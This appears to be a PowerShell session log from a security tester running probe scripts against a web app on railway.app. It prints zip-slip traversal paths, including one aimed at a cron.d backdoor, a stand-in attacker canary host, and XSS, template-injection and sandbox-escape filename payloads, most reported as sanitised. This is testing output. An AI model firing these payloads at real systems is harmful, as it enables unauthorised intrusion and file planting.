@@ -1,0 +1,270 @@
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\930140> cd downloads
+PS C:\Users\930140\downloads> cd stackhawk
+PS C:\Users\930140\downloads\stackhawk> python prompt_injection_probe.py
+4525602648407157431
+PS C:\Users\930140\downloads\stackhawk> node ssrf_rce_probe.js
+PS C:\Users\930140\downloads\stackhawk> python generate_zipslip.py
+[+] Created: zipslip_payload.zip (1.7 KB)
+[+] Entries: 10
+
+Traversal paths embedded:
+  '../../../tmp/zipslip_test.txt'
+  '../../../../etc/cron.d/zipslip_backdoor'
+  '../../zipslip_canary.txt'
+  '..\\..\\..\\Windows\\Temp\\zipslip_test.txt'
+  '%2e%2e%2f%2e%2e%2ftmp%2fzipslip_encoded.txt'
+  '%252e%252e%252f%252e%252e%252ftmp%252fzipslip_double_encoded.txt'
+  'safe_looking_file\x00.py'
+  'src/main.py'
+  'src/utils.py'
+  'README.md'
+
+Upload to: POST https://dev-guardian-production.up.railway.app/scan/folder
+Field    : ZIP file (multipart/form-data)
+
+Indicators of vulnerability:
+  - HTTP 500 with path error
+  - Check if /tmp/zipslip_test.txt exists on server
+  - Check canary: http://canary.attacker.invalid/zipslip (use Burp Collaborator)
+PS C:\Users\930140\downloads\stackhawk> node file-upload-fuzz.js
+C:\Users\930140\downloads\stackhawk\file-upload-fuzz.js:101
+var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender");
+                 ^
+
+ReferenceError: Java is not defined
+    at Object.<anonymous> (C:\Users\930140\downloads\stackhawk\file-upload-fuzz.js:101:18)
+    at Module._compile (node:internal/modules/cjs/loader:1761:14)
+    at Object..js (node:internal/modules/cjs/loader:1893:10)
+    at Module.load (node:internal/modules/cjs/loader:1481:32)
+    at Module._load (node:internal/modules/cjs/loader:1300:12)
+    at TracingChannel.traceSync (node:diagnostics_channel:328:14)
+    at wrapModuleLoad (node:internal/modules/cjs/loader:245:24)
+    at Module.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:154:5)
+    at node:internal/main/run_main_module:33:47
+
+Node.js v24.13.0
+PS C:\Users\930140\downloads\stackhawk> python headers_cors_probe.py
+Security Headers & CORS Probe
+Target: https://dev-guardian-production.up.railway.app
+
+
+────────────────────────────────────────────────────────────
+Endpoint: https://dev-guardian-production.up.railway.app/ui
+────────────────────────────────────────────────────────────
+  HTTP 200
+
+  ✗ MISSING                      Strict-Transport-Security
+                                 (HSTS — enforces HTTPS)
+  ✗ MISSING                      Content-Security-Policy
+                                 (CSP — mitigates XSS)
+  ✗ MISSING                      X-Content-Type-Options
+                                 (Prevents MIME sniffing)
+  ✗ MISSING                      X-Frame-Options
+                                 (Clickjacking protection)
+  - ABSENT (recommended)         Referrer-Policy
+                                 (Controls referrer leakage)
+  - ABSENT (recommended)         Permissions-Policy
+                                 (Restricts browser features)
+  ✗ MISSING                      Cache-Control
+                                 (Prevents caching of sensitive reports)
+
+  ✗ DISCLOSURE               Server: 'railway-edge'
+
+────────────────────────────────────────────────────────────
+Endpoint: https://dev-guardian-production.up.railway.app/scan/file
+────────────────────────────────────────────────────────────
+  HTTP 404
+
+  ✗ MISSING                      Strict-Transport-Security
+                                 (HSTS — enforces HTTPS)
+  ✗ MISSING                      Content-Security-Policy
+                                 (CSP — mitigates XSS)
+  ✗ MISSING                      X-Content-Type-Options
+                                 (Prevents MIME sniffing)
+  ✗ MISSING                      X-Frame-Options
+                                 (Clickjacking protection)
+  - ABSENT (recommended)         Referrer-Policy
+                                 (Controls referrer leakage)
+  - ABSENT (recommended)         Permissions-Policy
+                                 (Restricts browser features)
+  ✗ MISSING                      Cache-Control
+                                 (Prevents caching of sensitive reports)
+
+  ✗ DISCLOSURE               Server: 'railway-edge'
+
+────────────────────────────────────────────────────────────
+Endpoint: https://dev-guardian-production.up.railway.app/scan/folder
+────────────────────────────────────────────────────────────
+  HTTP 404
+
+  ✗ MISSING                      Strict-Transport-Security
+                                 (HSTS — enforces HTTPS)
+  ✗ MISSING                      Content-Security-Policy
+                                 (CSP — mitigates XSS)
+  ✗ MISSING                      X-Content-Type-Options
+                                 (Prevents MIME sniffing)
+  ✗ MISSING                      X-Frame-Options
+                                 (Clickjacking protection)
+  - ABSENT (recommended)         Referrer-Policy
+                                 (Controls referrer leakage)
+  - ABSENT (recommended)         Permissions-Policy
+                                 (Restricts browser features)
+  ✗ MISSING                      Cache-Control
+                                 (Prevents caching of sensitive reports)
+
+  ✗ DISCLOSURE               Server: 'railway-edge'
+
+────────────────────────────────────────────────────────────
+Endpoint: https://dev-guardian-production.up.railway.app/health
+────────────────────────────────────────────────────────────
+  HTTP 200
+
+  ✗ MISSING                      Strict-Transport-Security
+                                 (HSTS — enforces HTTPS)
+  ✗ MISSING                      Content-Security-Policy
+                                 (CSP — mitigates XSS)
+  ✗ MISSING                      X-Content-Type-Options
+                                 (Prevents MIME sniffing)
+  ✗ MISSING                      X-Frame-Options
+                                 (Clickjacking protection)
+  - ABSENT (recommended)         Referrer-Policy
+                                 (Controls referrer leakage)
+  - ABSENT (recommended)         Permissions-Policy
+                                 (Restricts browser features)
+  ✗ MISSING                      Cache-Control
+                                 (Prevents caching of sensitive reports)
+
+  ✗ DISCLOSURE               Server: 'railway-edge'
+
+────────────────────────────────────────────────────────────
+Endpoint: https://dev-guardian-production.up.railway.app/docs
+────────────────────────────────────────────────────────────
+  HTTP 200
+
+  ✗ MISSING                      Strict-Transport-Security
+                                 (HSTS — enforces HTTPS)
+  ✗ MISSING                      Content-Security-Policy
+                                 (CSP — mitigates XSS)
+  ✗ MISSING                      X-Content-Type-Options
+                                 (Prevents MIME sniffing)
+  ✗ MISSING                      X-Frame-Options
+                                 (Clickjacking protection)
+  - ABSENT (recommended)         Referrer-Policy
+                                 (Controls referrer leakage)
+  - ABSENT (recommended)         Permissions-Policy
+                                 (Restricts browser features)
+  ✗ MISSING                      Cache-Control
+                                 (Prevents caching of sensitive reports)
+
+  ✗ DISCLOSURE               Server: 'railway-edge'
+
+============================================================
+CORS Configuration
+============================================================
+
+  Origin   : https://attacker.invalid
+  ACAO     : (not set)
+  ACAC     : (not set)
+  Methods  : (not set)
+  ✓ No CORS misconfiguration detected for this origin
+
+  Origin   : https://evil.dev-guardian-production.up.railway.app
+  ACAO     : (not set)
+  ACAC     : (not set)
+  Methods  : (not set)
+  ✓ No CORS misconfiguration detected for this origin
+
+  Origin   : null
+  ACAO     : (not set)
+  ACAC     : (not set)
+  Methods  : (not set)
+  ✓ No CORS misconfiguration detected for this origin
+
+  Origin   : https://localhost
+  ACAO     : (not set)
+  ACAC     : (not set)
+  Methods  : (not set)
+  ✓ No CORS misconfiguration detected for this origin
+
+  Origin   : http://localhost:3000
+  ACAO     : (not set)
+  ACAC     : (not set)
+  Methods  : (not set)
+  ✓ No CORS misconfiguration detected for this origin
+
+============================================================
+Error Page Information Disclosure
+============================================================
+
+  404 path: HTTP 404
+  ✓ No stack traces or sensitive strings in error response
+
+  Empty POST (no file): HTTP 404
+  ✓ No stack traces or sensitive strings in error response
+
+  Empty POST (no ZIP): HTTP 404
+  ✓ No stack traces or sensitive strings in error response
+
+============================================================
+References:
+  OWASP A05:2021 — Security Misconfiguration
+  securityheaders.com for header grading
+  OWASP CORS Cheat Sheet
+PS C:\Users\930140\downloads\stackhawk> python xss_report_probe.py
+============================================================
+XSS via Filename / Report Reflection Probe
+Target: https://dev-guardian-production.up.railway.app/scan/file
+============================================================
+
+  Payload : Script tag in filename
+  Filename: "<script>alert('XSS-FILENAME')</script>.py"
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : IMG onerror in filename
+  Filename: '"><img src=x onerror="alert(\'XSS-IMG\')">_.py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : SVG onload in filename
+  Filename: "test<svg/onload=alert('XSS-SVG')>.py"
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : Template SSTI probe (expect '49' in report if vulnerable)
+  Filename: '{{7*7}}.py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : AngularJS sandbox escape
+  Filename: "{{constructor.constructor('alert(1)')()}}.py"
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : Null byte bypass
+  Filename: 'safe\x00<script>alert(1)</script>.py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : URL-encoded script tag
+  Filename: '%3Cscript%3Ealert(1)%3C%2Fscript%3E.py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : Double URL-encoded script tag
+  Filename: '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : CSS expression injection
+  Filename: 'style=xss:expression(alert(1)).py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+  Payload : JavaScript URI scheme
+  Filename: 'javascript:alert(1).py'
+  Status  : HTTP 404 — ✓ Sanitised
+
+============================================================
+RESULT: No XSS indicators detected. Manual review recommended.
+
+References:
+  OWASP A03:2021 — Injection
+  OWASP Testing Guide — OTG-INPVAL-001
+PS C:\Users\930140\downloads\stackhawk>
